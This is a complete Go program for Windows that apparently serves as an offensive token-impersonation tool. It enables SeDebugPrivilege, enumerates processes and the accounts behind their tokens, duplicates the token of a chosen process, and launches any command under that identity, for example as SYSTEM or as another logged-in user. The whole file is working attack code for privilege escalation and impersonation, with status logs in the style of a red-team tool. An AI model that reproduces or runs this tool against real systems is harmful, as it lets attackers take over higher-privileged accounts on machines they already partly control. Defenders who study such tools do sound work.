package main

import (
	"flag"
	"fmt"
	"log"
	"os"
	"os/user"
	"strings"
	"syscall"
	"unsafe"
)

// References: https://stackoverflow.com/questions/39595252/shutting-down-windows-using-golang-code
type Luid struct {
	lowPart  uint32 // DWORD
	highPart int32  // long
}
type LuidAndAttributes struct {
	luid       Luid   // LUID
	attributes uint32 // DWORD
}

type TokenPrivileges struct {
	privilegeCount uint32
	privileges     [64]LuidAndAttributes
}

var (
	// kernel32DLL = syscall.NewLazyDLL("Kernel32.dll")
	advapi32DLL = syscall.NewLazyDLL("Advapi32.dll")

	// GetCurrentProcess       	= kernel32DLL.NewProc("GetCurrentProcess")       // https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getcurrentprocess
	// OpenProcess             	= kernel32DLL.NewProc("OpenProcess")             // https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
	// CreateToolhelp32Snapshot	= kernel32DLL.NewProc("CreateToolhelp32Snapshot")// https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot
	// OpenProcessToken        	= advapi32DLL.NewProc("OpenProcessToken")        // https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocesstoken
	LookupPrivilegeValueW   = advapi32DLL.NewProc("LookupPrivilegeValueW")   // https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-lookupprivilegevaluew
	AdjustTokenPrivileges   = advapi32DLL.NewProc("AdjustTokenPrivileges")   // https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-adjusttokenprivileges
	ImpersonateLoggedOnUser = advapi32DLL.NewProc("ImpersonateLoggedOnUser") // https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-impersonateloggedonuser
	DuplicateTokenEx        = advapi32DLL.NewProc("DuplicateTokenEx")        // https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-duplicatetokenex
	CreateProcessWithTokenW = advapi32DLL.NewProc("CreateProcessWithTokenW") // https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw
)

const (
	// [Access Rights for Access-Token Objects](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-rights-for-access-token-objects)
	TOKEN_QUERY             = 0x0008 // Required to query an access token.
	TOKEN_DUPLICATE         = 0x0002 // Required to duplicate an access token.
	TOKEN_ADJUST_PRIVILEGES = 0x0020 // Required to enable or disable the privileges in an access token.
	// [Process Security and Access Rights](https://docs.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
	PROCESS_QUERY_INFORMATION         = 0x0400
	PROCESS_QUERY_LIMITED_INFORMATION = 0x1000 // Windows Server 2003 and Windows XP: This access right is not supported.
	// [ACCESS_MASK](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/7a53f60e-e730-4dfe-bbe9-b21b62eb790b)
	MAXIMUM_ALLOWED = 0x02000000
	// [SECURITY_IMPERSONATION_LEVEL enumeration](https://docs.microsoft.com/en-us/windows/win32/api/winnt/ne-winnt-security_impersonation_level)
	SecurityImpersonation = 2
	// [TOKEN_TYPE enumeration](https://docs.microsoft.com/en-us/windows/win32/api/winnt/ne-winnt-token_type)
	TokenPrimary = 1
	// [CreateProcessWithTokenW function](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)
	LOGON_WITH_PROFILE = 0x00000001
	// [CreateToolhelp32Snapshot function](https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot)
	TH32CS_SNAPPROCESS              = 0x00000002
	SE_PRIVILEGE_ENABLED_BY_DEFAULT = 0x00000001
	SE_PRIVILEGE_ENABLED            = 0x00000002
	SE_PRIVILEGE_REMOVED            = 0x00000004
	TokenElevation                  = 20
	SECURITY_MANDATORY_SYSTEM_RID   = 0x4000
	PROCESS_ALL_ACCESS              = 0x1F0FFF
)

var privilegeNames = map[uint32]string{
	5:  "SeCreateTokenPrivilege",
	8:  "SeSecurityPrivilege",
	9:  "SeTakeOwnershipPrivilege",
	10: "SeLoadDriverPrivilege",
	11: "SeSystemProfilePrivilege",
	12: "SeSystemtimePrivilege",
	13: "SeProfileSingleProcessPrivilege",
	14: "SeIncreaseBasePriorityPrivilege",
	15: "SeCreatePagefilePrivilege",
	17: "SeBackupPrivilege",
	18: "SeRestorePrivilege",
	19: "SeShutdownPrivilege",
	20: "SeDebugPrivilege",
	22: "SeSystemEnvironmentPrivilege",
	23: "SeChangeNotifyPrivilege",
	24: "SeRemoteShutdownPrivilege",
	25: "SeUndockPrivilege",
	28: "SeManageVolumePrivilege",
	29: "SeImpersonatePrivilege",
	30: "SeCreateGlobalPrivilege",
	33: "SeIncreaseWorkingSetPrivilege",
	34: "SeTimeZonePrivilege",
	35: "SeCreateSymbolicLinkPrivilege",
	36: "SeRelabelPrivilege",
}

func enableSeDebugPrivilege() error {
	var CurrentTokenHandle syscall.Token
	var tkp TokenPrivileges
	// [Privilege Constants (Authorization)](https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants)
	SE_DEBUG_NAME := syscall.StringToUTF16Ptr("SeDebugPrivilege")

	CurrentProcessHandle, err := syscall.GetCurrentProcess()
	if err != nil {
		log.Println("[-] GetCurrentProcess() error:", err)
	} else {
		log.Println("[+] GetCurrentProcess() success")
	}

	err = syscall.OpenProcessToken(CurrentProcessHandle, TOKEN_QUERY|TOKEN_ADJUST_PRIVILEGES, &CurrentTokenHandle)
	if err != nil {
		log.Println("[-] OpenProcessToken() error:", err)
	} else {
		log.Println("[+] OpenProcessToken() success")
	}

	result, _, err := LookupPrivilegeValueW.Call(uintptr(0), uintptr(unsafe.Pointer(SE_DEBUG_NAME)), uintptr(unsafe.Pointer(&(tkp.privileges[0].luid))))
	if result != 1 {
		log.Println("[-] LookupPrivilegeValue() error:", err)
	} else {
		log.Println("[+] LookupPrivilegeValue() success")
	}

	result, _, err = AdjustTokenPrivileges.Call(uintptr(CurrentTokenHandle), 0, uintptr(unsafe.Pointer(&tkp)), 0, uintptr(0), 0)
	if result != 1 {
		log.Println("[-] AdjustTokenPrivileges() error:", err)
	} else {
		log.Println("[+] AdjustTokenPrivileges() success")
	}

	return err
}

func getPrivileges(token syscall.Token) {
	var tokenInfoLength uint32
	syscall.GetTokenInformation(token, syscall.TokenPrivileges, nil, 0, &tokenInfoLength)
	buffer := make([]byte, tokenInfoLength)
	err := syscall.GetTokenInformation(token, syscall.TokenPrivileges, &buffer[0], tokenInfoLength, &tokenInfoLength)
	if err != nil {
		log.Printf("[-] GetTokenInformation failed: %v", err)
		return
	}

	tp := (*TokenPrivileges)(unsafe.Pointer(&buffer[0]))

	var enabledPrivileges []string
	for i := uint32(0); i < tp.privilegeCount; i++ {
		privilege := tp.privileges[i]
		if privilege.attributes&SE_PRIVILEGE_ENABLED != 0 {
			if name := privilegeNames[privilege.luid.lowPart]; name != "" {
				enabledPrivileges = append(enabledPrivileges, name)
			}
		}
	}

	if len(enabledPrivileges) > 0 {
		log.Printf("[+] Enabled privileges: %s\n", strings.Join(enabledPrivileges, ", "))
	} else {
		log.Println("[+] No enabled privileges found")
	}
}

func getPrivilegeAttributesString(attributes uint32) string {
	var status []string
	if attributes&SE_PRIVILEGE_ENABLED_BY_DEFAULT != 0 {
		status = append(status, "ENABLED_BY_DEFAULT")
	}
	if attributes&SE_PRIVILEGE_ENABLED != 0 {
		status = append(status, "ENABLED")
	}
	if attributes&SE_PRIVILEGE_REMOVED != 0 {
		status = append(status, "REMOVED")
	}
	if len(status) == 0 {
		return "DISABLED"
	}
	return strings.Join(status, "|")
}

func getUserInfo() (string, bool) {
	currentUser, err := user.Current()
	if err != nil {
		return "Unknown", false
	}

	var token syscall.Token
	process, _ := syscall.GetCurrentProcess()
	err = syscall.OpenProcessToken(process, syscall.TOKEN_QUERY, &token)
	if err != nil {
		return currentUser.Username, false
	}
	defer token.Close()

	var isElevated uint32
	var returnLen uint32
	err = syscall.GetTokenInformation(token, TokenElevation, (*byte)(unsafe.Pointer(&isElevated)), 4, &returnLen)

	return currentUser.Username, isElevated != 0
}

func getTokenUserInfo(token syscall.Token) string {
	var tokenInfoLength uint32
	syscall.GetTokenInformation(token, syscall.TokenUser, nil, 0, &tokenInfoLength)
	buffer := make([]byte, tokenInfoLength)
	err := syscall.GetTokenInformation(token, syscall.TokenUser, &buffer[0], tokenInfoLength, &tokenInfoLength)
	if err != nil {
		return "Unknown"
	}

	tokenUser := (*syscall.Tokenuser)(unsafe.Pointer(&buffer[0]))
	account, domain, _, err := tokenUser.User.Sid.LookupAccount("")
	if err != nil {
		return "Unknown"
	}
	return domain + "\\" + account
}

func isRealUser(username string) bool {
	systemPrefixes := []string{
		"NT AUTHORITY\\",
		"SYSTEM",
		"LOCAL SERVICE",
		"NETWORK SERVICE",
		"BUILTIN\\",
		"NT SERVICE\\",
		"IIS APPPOOL\\",
	}

	for _, prefix := range systemPrefixes {
		if strings.HasPrefix(strings.ToUpper(username), strings.ToUpper(prefix)) {
			return false
		}
	}

	parts := strings.Split(username, "\\")
	if len(parts) != 2 {
		return false
	}
	username = parts[1]

	userPath := "C:\\Users\\" + username
	if _, err := os.Stat(userPath); err == nil {
		typicalFolders := []string{
			"Desktop",
			"Documents",
			"Downloads",
			"AppData",
		}

		for _, folder := range typicalFolders {
			if _, err := os.Stat(userPath + "\\" + folder); err == nil {
				return true
			}
		}
	}

	return false
}

type ProcessInfo struct {
	PID      uint32
	UserName string
	ExeName  string
	Token    syscall.Token
}

func getAllProcesses() []ProcessInfo {
	var processes []ProcessInfo

	snapshot, err := syscall.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
	if err != nil {
		log.Printf("[-] Failed to create snapshot: %v\n", err)
		return processes
	}
	defer syscall.CloseHandle(snapshot)

	var pe syscall.ProcessEntry32
	pe.Size = uint32(unsafe.Sizeof(pe))

	err = syscall.Process32First(snapshot, &pe)
	if err != nil {
		log.Printf("[-] Failed to get first process: %v\n", err)
		return processes
	}

	for {
		if handle, err := syscall.OpenProcess(PROCESS_QUERY_INFORMATION, false, pe.ProcessID); err == nil {
			var token syscall.Token
			if err := syscall.OpenProcessToken(handle, TOKEN_QUERY, &token); err == nil {
				processes = append(processes, ProcessInfo{
					PID:      pe.ProcessID,
					UserName: getTokenUserInfo(token),
					ExeName:  syscall.UTF16ToString(pe.ExeFile[:]),
					Token:    token,
				})
			}
			syscall.CloseHandle(handle)
		}

		if err = syscall.Process32Next(snapshot, &pe); err != nil {
			break
		}
	}

	return processes
}

func listProcesses() {
	processes := getAllProcesses()
	defer func() {
		for _, p := range processes {
			p.Token.Close()
		}
	}()

	log.Println("[+] PID\tUser\t\t\tProcess Name")
	log.Println(" ===\t====\t\t\t============")

	for _, proc := range processes {
		userType := "🤖"
		if isRealUser(proc.UserName) {
			userType = "👤"
		}
		fmt.Printf("\t\t\t%d\t%s %-40s\t%s\n", proc.PID, userType, proc.UserName, proc.ExeName)
	}
}

func listUniqueTokens() {
	processes := getAllProcesses()
	defer func() {
		for _, p := range processes {
			p.Token.Close()
		}
	}()

	uniqueTokens := make(map[string][]uint32)
	for _, proc := range processes {
		uniqueTokens[proc.UserName] = append(uniqueTokens[proc.UserName], proc.PID)
	}

	log.Println("[+] Available Tokens in System:")
	log.Println("================================")

	for userName, pids := range uniqueTokens {
		userType := "🤖 System Account"
		if isRealUser(userName) {
			userType = "👤 Real User"
		}
		log.Printf("[+] Token User: %s (%s)\n", userName, userType)
		log.Printf("    Associated PIDs: %v\n", pids)
		if len(pids) > 0 {
			for _, proc := range processes {
				if proc.PID == pids[0] {
					log.Print("    Privileges: ")
					getPrivileges(proc.Token)
					break
				}
			}
		}
		log.Println("--------------------------------")
	}
}

// Reference: https://github.com/yusufqk/SystemToken/blob/master/main.c len 102
func handleProcess(pid uint32) syscall.Handle {
	log.Println("[+] OpenProcess() start.")
	ProcessHandle, err := syscall.OpenProcess(PROCESS_QUERY_INFORMATION, true, pid)
	if err != nil {
		ProcessHandle, err = syscall.OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, true, pid)
		if err != nil {
			log.Println("[-] OpenProcess() error:", err)
		}
	} else {
		log.Println("[+] OpenProcess() success:", ProcessHandle)
		var procToken syscall.Token
		if err := syscall.OpenProcessToken(ProcessHandle, TOKEN_QUERY, &procToken); err == nil {
			log.Printf("[+] Target process running as: %s\n", getTokenUserInfo(procToken))
			procToken.Close()
		}
	}
	return ProcessHandle
}

func runAsToken(TokenHandle uintptr, command *uint16) error {
	var NewTokenHandle syscall.Token
	var StartupInfo syscall.StartupInfo
	var ProcessInformation syscall.ProcessInformation

	result, _, err := DuplicateTokenEx.Call(TokenHandle, MAXIMUM_ALLOWED, uintptr(0), SecurityImpersonation, TokenPrimary, uintptr(unsafe.Pointer(&NewTokenHandle)))
	if result != 1 {
		log.Println("[-] DuplicateTokenEx() error:", err)
	} else {
		log.Println("[+] DuplicateTokenEx() success")
		log.Printf("[+] New token user: %s\n", getTokenUserInfo(NewTokenHandle))
		log.Println("[+] New token privileges after duplication:")
		getPrivileges(NewTokenHandle)
	}

	result, _, err = CreateProcessWithTokenW.Call(uintptr(NewTokenHandle), LOGON_WITH_PROFILE, uintptr(0), uintptr(unsafe.Pointer(command)), 0, uintptr(0), uintptr(0), uintptr(unsafe.Pointer(&StartupInfo)), uintptr(unsafe.Pointer(&ProcessInformation)))
	if result != 1 {
		log.Println("[-] CreateProcessWithTokenW() error:", err)
	} else {
		log.Println("[+] CreateProcessWithTokenW() success")
	}

	return err
}

func main() {
	username, isElevated := getUserInfo()
	if isElevated {
		log.Printf("[+] Current user: %s (UAC bypassed)", username)
	} else {
		log.Println("[!] Process is running with normal privileges, need to elevate privileges.")
		os.Exit(1)
	}

	var pid int
	var command string
	var list bool
	var tokens bool

	flag.IntVar(&pid, "p", 0, "Target Process PID.")
	flag.StringVar(&command, "c", "Aquilao", "Execute Command.")
	flag.BoolVar(&list, "l", false, "List all processes with their tokens")
	flag.BoolVar(&tokens, "t", false, "List available unique tokens in system")
	flag.Parse()

	if tokens {
		listUniqueTokens()
		return
	}

	flag.Parse()

	if list {
		listProcesses()
		return
	}

	if pid != 0 && command != "Aquilao" {
		log.Println("[+] Process Pid: ", pid)
		log.Println("[+] Execute Command: ", command)

		var currentToken syscall.Token
		currentProcess, _ := syscall.GetCurrentProcess()
		err := syscall.OpenProcessToken(currentProcess, TOKEN_QUERY, &currentToken)
		if err == nil {
			getPrivileges(currentToken)
		}

		enableSeDebugPrivilege()
		ProcessHandle := handleProcess(uint32(pid))

		var TokenHandle syscall.Token
		err = syscall.OpenProcessToken(ProcessHandle, TOKEN_QUERY|TOKEN_DUPLICATE, &TokenHandle)
		if err != nil {
			log.Println("[-] OpenProcessToken() error:", err)
		} else {
			log.Println("[+] OpenProcessToken() success")
			log.Println("[+] Target process privileges:")
			getPrivileges(TokenHandle)
		}

		runAsToken(uintptr(TokenHandle), syscall.StringToUTF16Ptr(command))
	} else {
		log.Println("[-] Please input pid and command, type \"-h\" see help.")
	}
}
